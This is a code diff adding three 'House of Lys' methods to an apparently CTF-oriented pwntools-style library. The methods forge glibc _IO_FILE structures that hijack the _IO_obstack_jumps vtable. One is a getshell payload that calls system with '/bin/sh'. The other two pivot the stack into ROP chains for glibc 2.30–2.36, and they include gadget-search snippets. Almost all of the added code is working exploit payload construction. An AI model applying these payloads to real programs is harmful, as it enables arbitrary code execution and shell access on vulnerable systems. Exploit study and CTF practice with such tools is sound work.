@@ -253,6 +253,128 @@ class IO_FILE_plus_struct(FileStructure):
 
     house_of_apple2_stack_pivoting_when_do_IO_operation = house_of_apple2_stack_pivoting_when_exit
 
+    def house_of_Lys_getshell_when_exit_under_2_37(self,
+                                                   system_addr : int, 
+                                                   _IO_obstack_jumps_addr : int, 
+                                                   fp_heap_addr : int,
+                                                   ):
+        '''
+        House_of_Lys to getshell:
+        Args:
+            system_addr: Address of system
+            _IO_obstack_jumps_addr: Address of _IO_obstack_jumps
+            fp_heap_addr: The heap addr that replace original _IO_list_all or chain
+        '''
+        assert context.bits == 64, "only support amd64!"
+        self._IO_read_base = 1
+        self._IO_write_base = 0
+        self._IO_write_ptr = 1
+        self._IO_write_end = 0
+        self._IO_buf_base = system_addr
+        self._IO_save_base = fp_heap_addr + 0xa0
+        self._IO_backup_base = 1
+        self._wide_data = 0x68732f6e69622f
+        self.vtable = _IO_obstack_jumps_addr + 0x20
+        return self.__bytes__() + pack(fp_heap_addr, 64)
+
+    def house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36(self,
+                                                                    fp_heap_addr : int,
+                                                                    _IO_obstack_jumps_addr : int, 
+                                                                    rop_payload : str or bytes,
+                                                                    magic_gadget_one_addr : int,
+                                                                    magic_gadget_two_addr : int,
+                                                                    magic_gadget_three_addr : int):
+        '''
+        House_of_Lys to execute ROP chain by stack pivoting:
+
+        Args:
+            fp_heap_addr(int): The heap addr that replace original _IO_list_all or chain
+            _IO_obstack_jumps_addr(int): Address of _IO_obstack_jumps
+            rop_payload(bytes or str): The ROP chain you wanner execute
+            magic_gadget_one_addr(int): Address of "mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]"
+            magic_gadget_two_addr(int): Address of "mov rsp, rdx; ret"
+            magic_gadget_three_addr(int): Address of "add rsp, 0x30; mov rax, r12; pop r12; ret"
+
+        Notices: 
+            1. The size of fp_heap must be exceeded  0x128+len(rop_payload)! If not, you can use [0xe0:] and payload_replace to set ropchain in other memory
+            2. We can use the following code to find gadgets:
+                libc.search(asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]")).__next__()
+                libc.search(asm("mov rsp, rdx; ret")).__next__()
+                libc.search(asm("add rsp, 0x30; mov rax, r12; pop r12; ret")).__next__()
+        '''
+        assert context.bits == 64, "only support amd64!"
+        rop_chain_addr = fp_heap_addr + 0xe8
+        self._IO_read_base = 1
+        self._IO_write_base = 0
+        self._IO_write_ptr = 1
+        self._IO_write_end = 0
+        self._IO_buf_base = magic_gadget_one_addr
+        self._IO_save_base = rop_chain_addr
+        self._IO_backup_base = 1
+        self.vtable = _IO_obstack_jumps_addr + 0x20
+        payload = flat(
+            {
+            0x0:self.__bytes__() + pack(fp_heap_addr, 64),
+            0xe8:{
+                0x0:magic_gadget_three_addr,
+                0x8:rop_chain_addr,    #Maybe sometimes you need to replace this address
+                0x20:magic_gadget_two_addr,
+                0x40:rop_payload
+            }
+            }
+        )
+        return payload
+
+    def house_of_Lys_stack_pivoting_when_exit_in_2_36(self,
+                                                      fp_heap_addr : int,
+                                                      _IO_obstack_jumps_addr : int,
+                                                      rop_payload : bytes or str,
+                                                      magic_gadget_one_addr : int,
+                                                      magic_gadget_two_addr :int,
+                                                      magic_gadget_three_addr : int,
+                                                      ):
+        '''
+        House_of_Lys to execute ROP chain by stack pivoting in GLibc 2.36:
+
+        Args:
+            fp_heap_addr(int): The heap addr that replace original _IO_list_all or chain
+            _IO_obstack_jumps_addr(int): Address of _IO_obstack_jumps
+            rop_payload(bytes or str): The ROP chain you wanner execute
+            magic_gadget_one_addr(int): Address of "mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]"
+            magic_gadget_two_addr(int): Address of "mov rsp, rdx; ret"
+            magic_gadget_three_addr(int): Address of "add rsp, 0x38 ; mov rax, rcx ; ret"
+
+        Notices: 
+            1. The size of fp_heap must be exceeded  0x130+len(rop_payload)! If not, you can use [0xe0:] and payload_replace to set ropchain in other memory
+            2. We can use the following code to find gadgets:
+                libc.search(asm("mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]")).__next__()
+                libc.search(asm("mov rsp, rdx; ret")).__next__()
+                libc.search(asm("add rsp, 0x38 ; mov rax, rcx ; ret")).__next__()
+        '''
+        assert context.bits == 64, "only support amd64!"
+        rop_chain_addr = fp_heap_addr + 0xe8
+        self._IO_read_base = 1
+        self._IO_write_base = 0
+        self._IO_write_ptr = 1
+        self._IO_write_end = 0
+        self._IO_buf_base = magic_gadget_one_addr - 0x8
+        self._IO_save_base = rop_chain_addr
+        self._IO_backup_base = 1
+        self.vtable = _IO_obstack_jumps_addr + 0x20
+        payload = flat(
+            {
+            0x0:self.__bytes__() + pack(fp_heap_addr, 64),
+            0xe8:{
+                0x0:rop_chain_addr,    #Maybe sometimes you need to replace this address
+                0x8:magic_gadget_three_addr,
+                0x28:magic_gadget_two_addr,
+                0x38:rop_chain_addr + 0x8,
+                0x48:rop_payload
+            }
+            }
+        )
+        return payload
+
 
 def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
     assert isinstance(payload, (str, bytes, int)), "wrong payload!"
